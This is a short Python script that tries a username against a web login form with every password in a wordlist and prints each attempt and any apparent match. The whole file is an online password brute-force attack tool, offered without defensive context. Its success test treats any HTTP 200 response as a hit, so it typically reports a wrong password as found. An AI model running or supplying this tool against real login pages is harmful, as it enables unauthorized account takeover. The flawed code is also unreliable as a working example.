import requests

def brute_force(url, username, wordlist_path):
    print(f"[*] Starting brute force on {url} with username: {username}")
    try:
        with open(wordlist_path, 'r') as file:
            for password in file:
                password = password.strip()
                data = {'username': username, 'password': password}
                response = requests.post(url, data=data)
                if "Welcome" in response.text or response.status_code == 200:
                    print(f"[+] Password found: {password}")
                    return
                else:
                    print(f"[-] Tried: {password}")
    except FileNotFoundError:
        print("[!] Wordlist file not found.")
